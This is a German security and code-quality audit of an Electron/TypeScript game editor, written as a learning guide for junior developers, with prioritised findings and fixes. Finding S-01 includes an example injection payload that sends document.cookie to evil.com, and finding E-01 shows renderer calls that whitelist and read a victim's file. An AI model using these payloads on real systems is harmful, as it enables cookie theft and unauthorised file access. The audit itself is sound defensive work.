# Senior Developer Audit — Umfassende Code-Qualitäts- und Security-Review

> **Datum:** 2026-04-19  
> **Reviewer:** Senior Developer Perspektive  
> **Scope:** Gesamtes Projekt (`src/`, `electron/`, Build-Konfiguration)  
> **Zielgruppe:** Junior Developer im Team — dient als Lern- und Verbesserungsleitfaden  
> **Basis:** Bestehende Audits (`Security_Audit.md`, `Dead_Code_Audit.md`, `Architecture_Audit_NewFeatures.md`) wurden konsolidiert und gegen den aktuellen Code verifiziert.

---

## Executive Summary

| Kategorie | Kritisch | Hoch | Mittel | Niedrig | Bereits Gefixt |
|:---|:---:|:---:|:---:|:---:|:---:|
| Security | 2 | 2 | 1 | 0 | 5 |
| Electron | 0 | 2 | 1 | 0 | 1 |
| Dead Code / Duplikate | 0 | 0 | 3 | 4 | 0 |
| Code-Qualität | 0 | 0 | 3 | 1 | 0 |
| **Gesamt** | **2** | **4** | **8** | **5** | **6** |

**Gesamtbewertung:** Das Projekt hat sich seit dem letzten Audit (12.04.) **deutlich verbessert** — 6 von 8 ursprünglichen Security-Findings wurden behoben. Es bleiben jedoch **2 kritische Script-Injection-Vektoren** und **4 hochpriorisierte Härtungslücken**, insbesondere im Electron-Kontext.

---

# TEIL A — Kritische und hochpriorisierte Findings

## 🔴 S-01 [KRITISCH] HTML-Export: Script-Injection via `</script>` im `projectJSON`

**Datei:** `src/export/GameExporter.ts` (Zeilen 371, 446)

```ts
const projectJSON = JSON.stringify(project, null, 2);
// ...
<script type="application/json" id="gcs-project-data">
${projectJSON}
</script>
```

**Problem:** Das `type="application/json"` verhindert Code-Ausführung nicht vollständig. Wenn ein Projekt-Feld (z.B. `meta.description`, `stage.name`) den String `</script>` enthält, bricht der Parser aus dem JSON-Block aus und der Rest wird als HTML interpretiert — inklusive nachfolgender `<script>`-Tags mit beliebigem Code.

**Angriffsszenario:**
```json
{ "meta": { "description": "</script><script>fetch('https://evil.com/'+document.cookie)</script>" } }
```

Ein mit diesem Projekt exportiertes Spiel führt beim Öffnen den Schadcode aus.

**Fix:**
```ts
const projectJSON = JSON.stringify(project, null, 2)
    .replace(/<\/script>/gi, '<\\/script>')
    .replace(/<!--/g, '<\\!--');
```

**Aufwand:** ~5 min.  
**Lesson für Juniors:** Beim Einbetten von JSON in HTML-`<script>`-Blöcke **immer** `</script>`-Sequenzen escapen. Gilt auch für `<!--` (HTML-Comment-Breakout) und `]]>` (CDATA).

---

## 🔴 S-02 [KRITISCH] `DialogExpressionEvaluator` nutzt `new Function()` mit Service-Registry-Zugriff

**Datei:** `src/editor/dialogs/utils/DialogExpressionEvaluator.ts` (Zeilen 19, 59, 79)

```ts
const fn = new Function('dialogData', 'project', 'taskName', 'actionName',
    'name', 'serviceRegistry', ..., `return ${code}`);
```

**Problem:** Dialog-Configs werden aus JSON geladen und enthalten Expression-Strings. Diese werden direkt als JavaScript mit vollem Zugriff auf `serviceRegistry` ausgeführt. Wenn ein Angreifer eine manipulierte Dialog-Config einschleust (z.B. über Import oder beim Laden eines fremden Projekts), kann er beliebigen Code ausführen — inkl. Aufruf von `window.electronFS.*` für Dateisystem-Zugriff.

**Unterschied zu `ExpressionParser`:** Der `ExpressionParser` wurde bereits auf einen sicheren JSEP-AST-Parser migriert — der `DialogExpressionEvaluator` hinkt hinterher.

**Fix:** Den gleichen JSEP-AST-Evaluator auch hier einsetzen. Alternativ: Dialog-Configs signieren oder auf eine deklarative DSL ohne Code-Ausführung umstellen.

**Aufwand:** ~2–4 Stunden (Migration auf AST-Evaluator).  
**Lesson für Juniors:** `new Function(string)` ist gleichwertig zu `eval()`. Sobald ein String aus externer Quelle (JSON, Netzwerk, User-Input) hineinfließt, ist das **Remote Code Execution (RCE)**. Alternativen: JSEP, esprima, peg.js, oder eigene eingeschränkte DSL.

---

## 🟠 E-01 [HOCH] Electron: `fs:allowPath` IPC-Handler ist Whitelist-Bypass

**Datei:** `electron/main.cjs` (Zeilen 147–153)

```js
ipcMain.handle('fs:allowPath', async (event, pathToAllow) => {
    if (security && pathToAllow) {
        security.addAllowedPath(pathToAllow);
        return true;
    }
    return false;
});
```

**Problem:** Der Renderer kann **ohne User-Interaktion** beliebige Pfade zur Security-Whitelist hinzufügen. Kombiniert mit einem XSS/RCE im Renderer (siehe S-01, S-02) ist die gesamte Pfad-Whitelist umgehbar:

```js
await window.electronFS.allowPath('C:/Users/victim/Documents');
await window.electronFS.readFile('C:/Users/victim/Documents/secret.txt');
```

**Fix-Optionen:**
- **A:** Handler entfernen, falls nicht zwingend benötigt.
- **B:** Handler nur aufrufbar machen, wenn unmittelbar davor ein `dialog.showOpenDialog` erfolgte (Session-Token).
- **C:** Whitelist-Aufruf auf Unterverzeichnisse der bestehenden `safeBaseDirs` einschränken.

**Aufwand:** ~30 min.  
**Lesson für Juniors:** IPC-Handler in Electron sind ein **Vertrauensgrenze-Übergang**. Niemals Renderer-Input ohne Validierung in sicherheitskritische Datenstrukturen übernehmen. Die Frage lautet immer: *„Was, wenn der Renderer kompromittiert ist?"*

---

## 🟠 E-02 [HOCH] Electron: Fehlende Window-Hardening und CSP

**Datei:** `electron/main.cjs` (Zeilen 8–18)

```js
const win = new BrowserWindow({
    webPreferences: {
        preload: path.join(__dirname, 'preload.cjs'),
        nodeIntegration: false,
        contextIsolation: true
    }
});
```

**Fehlend:**

1. **`sandbox: true`** — aktiviert OS-Level Sandbox für den Renderer (defense-in-depth)
2. **`setWindowOpenHandler`** — Popups/neue Fenster blockieren oder validieren
3. **`will-navigate`-Listener** — Navigation zu externen URLs unterbinden
4. **Content Security Policy (CSP)** — weder im Electron-Window noch in exportierter HTML
5. **`webSecurity: true`** ist zwar default, sollte aber explizit dokumentiert sein

**Konsequenz:** Falls ein XSS den Renderer kompromittiert, kann das exploitierte Fenster:
- Neue BrowserWindows öffnen (Phishing)
- Zu `file:///C:/...` navigieren und lokale Dateien laden
- Netzwerk-Requests zu beliebigen Domains absetzen

**Fix:**
```js
const win = new BrowserWindow({
    webPreferences: {
        preload: path.join(__dirname, 'preload.cjs'),
        nodeIntegration: false,
        contextIsolation: true,
        sandbox: true,
        webSecurity: true
    }
});

win.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));

win.webContents.on('will-navigate', (event, url) => {
    if (!url.startsWith('http://localhost:5173') && !url.startsWith('file://')) {
        event.preventDefault();
    }
});

// CSP via Session-Header
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Content-Security-Policy': ["default-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' ws: wss:;"]
        }
    });
});
```

**Aufwand:** ~1 Stunde inkl. Testing.  
**Lesson für Juniors:** Electron-Security ist ein Layered Approach. Context Isolation allein ist **nicht** ausreichend. Die [Electron Security Checklist](https://www.electronjs.org/docs/latest/tutorial/security) ist Pflichtlektüre.

---

# TEIL B — Mittelpriorisierte Findings

## 🟡 Q-01 [MITTEL] Dateigröße: 3 Dateien über 1000-Zeilen-Limit

Laut `DEVELOPER_GUIDELINES.md` Zeile 17 ist **max. 1000 Zeilen pro Datei** vorgeschrieben.

| Datei | Zeilen | Überhang |
|:---|:---:|:---:|
| `src/editor/inspector/InspectorRenderer.ts` | 1085 | +85 |
| `src/services/AgentController.ts` | 1080 | +80 |
| `src/runtime/GameRuntime.ts` | 1040 | +40 |

**Empfehlung:** Modul-Split nach Single Responsibility. Jede dieser Dateien hat deutlich mehr als eine Verantwortung.

**Lesson für Juniors:** 1000 Zeilen ist keine willkürliche Zahl. Eine Datei, die so lang wird, hat fast immer mehrere unabhängige Verantwortlichkeiten, die sich trennen lassen. Wenn du den Scroll-Balken mehrfach brauchst, um eine Methode zu verstehen, ist es Zeit für Refactoring.

---

## 🟡 Q-02 [MITTEL] 67 `console.*`-Aufrufe im Produktivcode

Guideline `DEVELOPER_GUIDELINES.md:111` verbietet `console.log/warn/error/info/debug` im Produktivcode. Es soll ausschließlich der zentrale `Logger` verwendet werden.

**Top-Verstöße:**

| Datei | Anzahl |
|:---|:---:|
| `src/editor/services/StageInteractionManager.ts` | 8 |
| `src/runtime/ExpressionParser.test.ts` | 7 (Test — OK) |
| `src/runtime/ReactiveRuntime.ts` | 7 |
| `src/services/ProjectStore.ts` | 7 |
| `src/utils/Logger.ts` | 6 (System — OK) |
| `src/runtime/GameRuntime.ts` | 5 |
| `src/components/TDebugLog.ts` | 5 |
| `src/export/GameExporter.ts` | 3 |

**Auch der generierte Export** (`GameExporter.ts:456, 460`) nutzt `console.error` im emittierten HTML — das umgeht den zentralen Logger auch zur Laufzeit im Standalone.

**Empfehlung:** Systematische Migration. Eventuell ein ESLint-Rule `no-console` mit Ausnahmen für Logger.ts und Tests einführen.

**Lesson für Juniors:** `console.log` in Produktivcode ist fast immer ein Debugging-Überrest. Der zentrale Logger ermöglicht UseCase-Filterung, saubere Production-Ausgabe und konsistente Formatierung.

---

## 🟡 Q-03 [MITTEL] 1574 `: any`-Annotationen (Type Safety Erosion)

**Top-Verursacher:**

| Datei | `:any` |
|:---|:---:|
| `src/runtime/GameRuntime.ts` | 44 |
| `src/runtime/TaskExecutor.ts` | 39 |
| `src/editor/PascalCodeGenerator.ts` | 35 |
| `src/editor/services/EditorDataManager.ts` | 35 |
| `src/services/registry/ReferenceTracker.ts` | 32 |
| `src/editor/inspector/InspectorRenderer.ts` | 31 |
| `src/services/ProjectStore.ts` | 30 |
| `src/services/AgentController.ts` | 29 |

**Kontext:** Ein bestehendes `TypeScript_Any_Audit.md` existiert bereits, aber die Migration läuft schleppend. Guideline fordert `unknown` statt `any` für unbekannte Shapes.

**Empfehlung:** 
- Keine **neuen** `:any` ohne inline-Kommentar mit Begründung.
- Iterative Rückmigration der Top-8 Dateien.
- CI-Gate: Anzahl `:any`-Vorkommen darf nicht steigen.

**Lesson für Juniors:** `any` schaltet den TypeScript-Compiler ab. Jedes `any` ist ein Vertrauensbruch gegenüber zukünftigen Maintainern. Wenn du die Shape wirklich nicht kennst, ist `unknown` der richtige Weg — er zwingt dich zu Type Guards.

---

## 🟡 D-01 [MITTEL] Multiplayer: Zwei konkurrierende Implementierungen

Bereits im `Dead_Code_Audit.md` (Punkt 2.1) dokumentiert, **noch nicht adressiert**.

**Zustand:**
- `src/runtime/MultiplayerManager.ts` → genutzt von `TaskExecutor.ts`, `RemoteGameManager.ts`
- `src/multiplayer/NetworkManager.ts` + Protocol/Lobby → genutzt von `player-standalone.ts`, `EditorRunManager.ts`

Beide implementieren Room-Management und WebSocket-Sync. **Zwei verschiedene Protocol-Definitionen.**

**Zusätzlich:** `src/multiplayer/CollisionSyncer.ts` und `InputSyncer.ts` sind **Pong-spezifisch** (Paddle-/Ball-Logik), gehören aber in ein generisches Multiplayer-Modul nicht hinein.

**Empfehlung:** Architektur-Entscheidung treffen und konsolidieren. Pong-spezifischen Code in ein Beispielspiel auslagern.

**Lesson für Juniors:** Zwei parallele Implementierungen für dieselbe Funktion sind ein klassisches „Legacy in the making"-Signal. Bei neuen Features **immer** zuerst prüfen, ob schon eine Implementierung existiert.

---

## 🟡 D-02 [MITTEL] Duplicate: `escapeHtml` in GameExporter vs. SecurityUtils

**Dateien:**
- `src/export/GameExporter.ts:661` — private Implementierung
- `src/utils/SecurityUtils.ts:56` — zentrale Implementierung

**Fix:** `GameExporter` auf `SecurityUtils.escapeHtml()` umstellen.

**Aufwand:** 2 min.  
**Lesson für Juniors:** Wenn du eine Utility schreibst, prüfe **immer** zuerst, ob es sie schon gibt. `grep` ist dein Freund.

---

## 🟡 D-03 [MITTEL] Facade ohne klare Nutzung: `PascalGenerator.ts`

**Datei:** `src/editor/PascalGenerator.ts`

Reine Pass-Through-Facade zu `PascalCodeGenerator` und `PascalCodeParser`. Wird von zwei Callern genutzt, während `FlowPascalManager` die Facade umgeht.

**Entscheidung nötig:**
- **A:** Facade entfernen, beide Caller direkt auf `PascalCodeGenerator` umstellen.
- **B:** Facade beibehalten und `FlowPascalManager` konsistent darauf umstellen.

**Aufwand:** ~30 min je nach Variante.  
**Lesson für Juniors:** Eine Facade ist nur wertvoll, wenn sie **einheitlich** genutzt wird. Sonst verdoppelt sie nur die Oberfläche und verwirrt.

---

# TEIL C — Niedrigprio (Cleanup / Quick Wins)

## 🟢 D-04 Dead Code: `src/engine/GameBase.ts`

**Datei:** `src/engine/GameBase.ts` (35 Zeilen)  
**Befund:** Keine externen Referenzen gefunden. Leere Hülle mit `start/stop/pause/resume`-Stubs.  
**Empfehlung:** ❌ Löschen. Auch den leeren `src/engine/`-Ordner.  
**Aufwand:** 1 min.

---

## 🟢 D-05 Dead Code: `src/stubs/node-stub.ts`

**Datei:** `src/stubs/node-stub.ts` (653 bytes)  
**Befund:** Keine Referenzen in Projekt/Build gefunden.  
**Empfehlung:** ❌ Löschen oder Nutzung im `vite.config.ts` nachverfolgen und dokumentieren.  
**Aufwand:** 2 min.

---

## 🟢 D-06 Tote Methoden in `PascalGenerator`

- `generateProcedure()` — nirgends aufgerufen
- `getLogicSignature()` — nirgends aufgerufen

**Empfehlung:** Entfernen.  
**Aufwand:** 2 min.

---

## 🟢 D-07 Pong-spezifische Syncer in generischem Multiplayer-Ordner

- `src/multiplayer/CollisionSyncer.ts` — Ball/Paddle-Logik
- `src/multiplayer/InputSyncer.ts` — spezifische Input-Signatur

**Empfehlung:** In ein Beispielspiel-Verzeichnis auslagern oder löschen, falls nicht mehr benötigt.

---

## 🟢 Q-04 `PascalHighlighter.escape()` — unvollständiges Escaping

**Datei:** `src/editor/PascalHighlighter.ts:77`

Escaped nur `& < >`, nicht `" '`. Nicht unmittelbar ausnutzbar (nur syntax highlighting), aber inkonsistent mit `SecurityUtils.escapeHtml()`.

**Empfehlung:** Durch `SecurityUtils.escapeHtml()` ersetzen.

---

# TEIL D — Was bereits gut läuft (Lernvorbild für Juniors)

Diese Fixes sind seit dem letzten Audit vom 12.04. erfolgt — **hier kann sich das Team ausdrücklich loben**:

| # | Finding | Datei | Status |
|:---:|:---|:---|:---:|
| 1 | `ExpressionParser` auf JSEP-AST migriert, `__proto__`/`constructor` gesperrt | `ExpressionParser.ts:201+` | ✅ |
| 2 | `sanitizeHTML` wird beim Laden von RichText angewendet | `TextObjectRenderer.ts:54` | ✅ |
| 3 | Dropdown-Options escaped | `InputRenderer.ts:216` | ✅ |
| 4 | Tooltip-Text escaped | `FlowInteractionManager.ts:539` | ✅ |
| 5 | ContextMenu-Label escaped + CSS-Color validiert | `ContextMenu.ts:105` | ✅ |
| 6 | Prototype Pollution Guard in Serialization | `Serialization.ts:67` | ✅ |
| 7 | Electron Path-Validierung (`fs:readFile`, `fs:writeFile`, `fs:listFiles`) | `main.cjs:80,95,113` | ✅ |
| 8 | Export-Pfade: Relative statt absolute URLs | `GameExporter.ts:168,604` | ✅ |
| 9 | `crypto.randomUUID` mit korrektem Fallback | `EditorInteractionManager.ts:196`, `EditorStageManager.ts:396` | ✅ |
| 10 | `ConfirmDialog` / `PromptDialog` statt native `confirm()`/`prompt()` | `ConfirmDialog.ts`, `PromptDialog.ts` | ✅ |

**Gemeinsames Muster:** Zentrale Utilities (`SecurityUtils`, `Logger`) wurden konsequent eingezogen. Das ist **die** richtige Richtung.

---

# TEIL E — Empfohlene Reihenfolge (konkrete Next Steps)

| # | Aufgabe | Prio | Aufwand | Gewinn |
|:---:|:---|:---:|:---:|:---|
| 1 | S-01 `</script>`-Escape im Export | 🔴 | 5 min | **KRITISCH** — XSS-Vektor schließen |
| 2 | E-01 `fs:allowPath` restriktiv machen | 🟠 | 30 min | Electron-Whitelist absichern |
| 3 | E-02 Electron Window-Hardening (sandbox, CSP, navigation) | 🟠 | 1 h | Defense-in-Depth |
| 4 | Q-02 `console.*` Batch-Migration (Top-5 Dateien) | 🟡 | 1 h | Guideline-Compliance |
| 5 | D-04/D-05/D-06 Dead-Code-Löschung | 🟢 | 10 min | Aufräumen, geringer Reibungsverlust |
| 6 | S-02 `DialogExpressionEvaluator` auf AST umstellen | 🔴 | 2–4 h | Zweiter RCE-Vektor schließen |
| 7 | Q-01 Dateigröße-Refactoring (InspectorRenderer, AgentController, GameRuntime) | 🟡 | 4–8 h | Wartbarkeit |
| 8 | D-01 Multiplayer-Konsolidierung | 🟡 | 4–8 h | Technical-Debt-Abbau |
| 9 | Q-03 `:any` Rückmigration (iterativ) | 🟡 | laufend | Type Safety |

**Summe Quick Wins (Punkte 1–5):** ca. 2,5 Stunden → schließt die akuten Sicherheitslücken und bereinigt sichtbare Baustellen.

---

# TEIL F — Lessons Learned für das Team

## Die 7 Goldenen Regeln (aus diesem Audit abgeleitet)

1. **Niemals `new Function(string)` mit externen Strings.** Nutze JSEP/AST-Parser oder deklarative DSL.
2. **Beim Einbetten von JSON in HTML immer `</script>` escapen** — auch in `<script type="application/json">`.
3. **Electron ist kein Browser.** Zusätzlich zu `contextIsolation` immer `sandbox: true`, `setWindowOpenHandler`, `will-navigate`-Guard und CSP.
4. **IPC-Handler sind Vertrauensgrenzen.** Jedes Renderer-Input muss validiert werden, als käme es von einem Angreifer.
5. **Zentrale Utilities vor lokalen Duplikaten.** `grep` vor `write`.
6. **`any` ist Schulden.** Nutze `unknown` + Type Guards für externe Daten.
7. **Dateien > 1000 Zeilen haben fast immer mehrere Verantwortlichkeiten.** Splitten statt scrollen.

---

## Wie wir diese Disziplin mittelfristig sicherstellen

- **ESLint-Rules aktivieren:**
  - `no-console` mit Whitelist für `Logger.ts`
  - `@typescript-eslint/no-explicit-any` als `warn` (nicht `error`, sonst Sturm)
  - Custom-Rule: Zeilen-Limit 1000 pro Datei
- **Pre-Commit-Hook:**
  - `npx knip` für Dead-Code-Detection
  - `rg "new Function\("` blockiert Commits außer in definierten Dateien
- **CI-Metriken tracken:**
  - Anzahl `:any`, `console.*`, Dateilänge über Zeit

---

## Referenz-Dokumente

- `ToDoList/Security_Audit.md` — ursprünglicher Security-Audit (teils erledigt)
- `ToDoList/Dead_Code_Audit.md` — Dead-Code-Audit (teils erledigt)
- `ToDoList/Architecture_Audit_NewFeatures.md` — Architektur-Audit (überwiegend erledigt)
- `ToDoList/TypeScript_Any_Audit.md` — Any-Audit (laufend)
- `DEVELOPER_GUIDELINES.md` — Normative Regeln

---

> **Hinweis an Junior-Entwickler:** Dieser Audit ist **keine Kritik**. Er ist die Landkarte eines Projekts, das sich bereits sichtbar verbessert (siehe Teil D). Die Fehler hier sind typisch für Projekte dieser Größe — entscheidend ist, wie systematisch wir sie abarbeiten. Jedes einzelne Finding ist eine Gelegenheit, bessere Intuitionen zu entwickeln.
